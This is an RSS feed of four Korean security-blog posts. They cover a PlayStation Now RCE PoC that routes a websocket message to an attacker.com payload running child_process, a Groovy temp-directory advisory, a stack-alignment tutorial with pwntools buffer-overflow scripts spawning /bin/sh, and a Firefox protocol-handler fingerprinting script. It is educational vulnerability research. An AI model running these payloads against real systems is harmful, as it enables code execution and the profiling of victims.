      <title>[하루한줄] Remote Code Execution in PlayStation Now</title>
      <link>https://hackyboiz.github.io/2020/12/08/l0ch/2020-12-08/</link>
      <guid>https://hackyboiz.github.io/2020/12/08/l0ch/2020-12-08/</guid>
      <pubDate>Tue, 08 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/873614&quot;&gt;RCE in PlayStation </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now ≤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>게임 스트리밍 서비스 PlayStation Now에서 원격 코드 실행 취약점이 발견되었습니다.<br><br><br>PS Now의 주요 구성요소로는 QAS와 AGL이 있습니다. QAS는 Qt5 프레임워크로 개발된  <code>psnowlauncher.exe</code> 실행파일이며 PS Now의 메인 애플리케이션입니다.  AGL은 Electron 응용 프로그램이며 QAS에 의해 실행됩니다. 처음 로드할 페이지의 URL을 매개변수로 받아 실행이 가능합니다.<br><br><br><code>nodeIntegration</code>은 <code>Electron BrowserWindows</code>에서 실행되는 기능으로 javascript에서 Windows 프로세스를 생성할 수 있습니다. 기본값은 false지만 AGL에서는 true로 설정되어 있으며, AGL은 로드하는 URL 검증을 하지 않아 해커의 페이로드가 담긴 URL을 통해 javascript에서 임의 코드를 실행할 수 있습니다.<br><br><br>이 임의 코드 실행 취약점은 QAS에서 실행되는 로컬 웹 소켓 서버를 통해 원격으로 수행할 수 있습니다. 웹사이트가 다음 request를 로컬 웹 소켓 서버에 보내면 AGL에 로드된 URL을 QAS에서 실행합니다.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>그러나 source와 target을 바꿔 URL을 AGL에서 로드할 수 있도록 구성하면 원격에서 AGL이 로드할 URL을 조작할 수 있습니다.<br><br><br>피해자의 컴퓨터에서 PS Now와 QAS, 로컬 웹 소켓이 실행 중일 경우 아래와 같은 방법으로 원격 코드 실행이 가능합니다.</p><ol><li><p>브라우저로 해커의 웹사이트에 접속합니다.</p></li><li><p>웹 사이트는 피해자 PC의 웹 소켓 서버 <code>ws://localhost:1235</code> 에 연결됩니다.</p></li><li><p>웹사이트는 웹 소켓 서버에 다음과 같은 메시지를 보냅니다. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGL은 <code>https://attacker.com/rce_payload.html</code> 를 로드합니다. 이때 <code>rce_payload.html</code>의 javascript 코드가 피해자의 PC에서 실행됩니다.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/playstation/">playstation</category>
      
      <category domain="https://hackyboiz.github.io/tags/remote-code-execution/">remote code execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/playstation-now/">playstation now</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/08/l0ch/2020-12-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17521: Apache Groovy Information Disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/07/idioth/2020-12-07/</link>
      <guid>https://hackyboiz.github.io/2020/12/07/idioth/2020-12-07/</guid>
      <pubDate>Mon, 07 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://seclists.org/oss-sec/2020/q4/183&quot;&gt;https://seclist</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovy에서 <code>createTempDir</code> method로 인한 Local Privilege Escalation과 Information Disclosure가 가능한 취약점이 발견되었습니다. 이 취약점은 유닉스 기반 운영 체제와 Mac OSX, Windows의 옛날 버전이 영향을 받습니다. 취약점에 노출되는 조건은 아래와 같습니다.</p><ul><li>영향을 받는 운영 체제에서 Groovy code가 동작</li><li>다른 유저가 Groovy code에 접근할 수 있음</li><li><code>createTempDir</code> extension method를 통해 임시 디렉터리가 생성</li></ul><p>Groovy는 모든 유저가 공유할 수 있는 OS 임시 디렉터리 내에 임시 디렉터리를 만들 수 있습니다. Groovy에서 <code>createTempDir</code> method를 사용하면 java stub을 생성할 때 사용되거나 user code를 대신하기 위한 임시 디렉터리가 생성됩니다. Groovy user code가 <code>createTempDir</code> method를 사용하여 임시 디렉터리에 실행할 수 있는 코드를 저장하면 Local Privilege Escalation이 가능하고 민감한 정보를 저장하기 위해 임시 디렉터리가 사용된다면 정보가 노출되거나 수정될 수 있습니다.</p><p>취약점이 수정된 Groovy 2.5 이상 버전과 JDK 7 이상에서 실행되는 Groovy 2.4에서는 Groovy Code를 실행하는 사용자만 읽을 수 있는 디렉터리를 생성하는 새로운 JDK method를 사용합니다. 하지만 이 방법은 Local Privilege Escalation은 막을 수 있지만 Information Disclosure는 막을 수 없습니다.</p><p>시스템 환경 변수 <code>java.io.tmpdir</code>를 실행 중인 사용자의 고유 디렉터리로 설정하면 모든 운영 체제와 Groovy 버전에서 취약점이 해결됩니다. 혹은 Groovy extension method 대신 JDK의 <code>Files#createTempDirectory</code> method를 사용하여 취약점을 방지할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/apache/">apache</category>
      
      <category domain="https://hackyboiz.github.io/tags/groovy/">groovy</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/07/idioth/2020-12-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] x64 stack alignment</title>
      <link>https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/</link>
      <guid>https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/</guid>
      <pubDate>Sun, 06 Dec 2020 04:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;머릿말&quot;&gt;&lt;a href=&quot;#머릿말&quot; class=&quot;headerlink&quot; title=&quot;머릿말&quot;&gt;&lt;/a&gt;머릿말&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/06/fabu1ous/x64-stack-alignment/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달해서 프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-alignment/">stack alignment</category>
      
      <category domain="https://hackyboiz.github.io/tags/rtl/">rtl</category>
      
      <category domain="https://hackyboiz.github.io/tags/rop/">rop</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-15680 : protocol handler infomation disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/05/fabu1ous/2020-12-05/</link>
      <guid>https://hackyboiz.github.io/2020/12/05/fabu1ous/2020-12-05/</guid>
      <pubDate>Sat, 05 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/leaking-bro</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox에서 Protocol Handler를 이용한 Information Disclosure 취약점이 발견되었습니다. Protocol Handler는 응용 프로그램이 자신의 URI scheme를 등록할 수 있는 매커니즘으로 이를 통해 프로세스를 실행할 수 있습니다. 브라우저가 Protocol Handler URI를 사용해 프로세스를 실행하면 “웹사이트에서 이 애플리케이션을 열려고 합니다.”라는 알림이 뜹니다.  </p><p>Firefox가 이미지 태그의 소스를 렌더링 할 때, Protocol Handler의 존재 여부에 따라 렌더링 결과가 다릅니다. 해커는 이점을 악용해 원격으로 victim에 설치된 프로그램 리스트를 알 수 있습니다.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victim에 존재하는 Protocol Handler를 이미지 src에 넣으면 broken image에 대한 기본 설정에 따라 Element의 size가 24x24로 렌더링 됩니다.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하지않는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>반면, 존재하지 않는 Protocol Handler를 이미지 src에 넣으면 Element의 size는 0x0으로 설정됩니다.</p><p>따라서 해커는 간단한 JS script로 Element의 width를 검사해 Protocol Handler의 존재 여부를 확인하는 brute force 공격을 할 수 있습니다.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content:encoded>
      
      
